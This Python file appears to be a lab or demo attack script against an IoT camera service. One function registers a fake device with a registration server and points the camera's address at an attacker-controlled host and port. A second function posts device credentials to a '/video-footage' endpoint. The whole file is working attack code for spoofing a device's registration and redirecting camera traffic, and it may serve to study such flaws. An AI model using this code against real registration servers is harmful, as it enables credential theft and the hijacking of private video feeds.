import yaml
import http
import json

def load_yaml_config(args):
    file_stream = open(args.config_file)
    try:
        yaml_config = yaml.safe_load(file_stream)
    except yaml.YAMLError as e:
        exit(-1)
    return yaml_config

def register_fake_device(reg_url:str,
                         reg_port:int, 
                         attacker_url:str,
                         attacker_port:int,
                         uuid:str) -> bool:
    
    endpoint:str = "/register-device"
    connection:http.client.HTTPConnection = http.client.HTTPConnection(host=reg_url, port=reg_port)

    data:dict[str, str] = { 
                            "uuid" : uuid, 
                            "cam_url"  : attacker_url,
                            "cam_port" : attacker_port
                          }
    
    json_data = json.dumps(data)
    try:
        connection.request('POST', endpoint, json_data, headers={"Content-Type" : "application/json"})
    except:
        return False

    response:http.client.HTTPResponse = connection.getresponse()
    response_string:str = response.read().decode()
    
    if response_string == "SUCCESS": return True
    else:                            return False
    
def request_video_footage(uuid,
                          device_ip_address,
                          device_port,
                          device_username,
                          device_password):
    endpoint:str = "/video-footage"
    connection:http.client.HTTPConnection = http.client.HTTPConnection(host=device_ip_address, port=device_port)

    data:dict[str, str] = { 
                            "uuid" : uuid, 
                            "device_username" : device_username, 
                            "device_password" : device_password
                            }
    
    json_data = json.dumps(data)
    try:
        connection.request('POST', endpoint, json_data, headers={"Content-Type" : "application/json"})
    except:
        return "FAILED TO AQUIRE VIDEO FOOTAGE... ATTEMPT MADE TO '%s:%s'" % (device_ip_address, device_port)

    response:http.client.HTTPResponse = connection.getresponse()
    response_string:str = response.read().decode()
    return response_string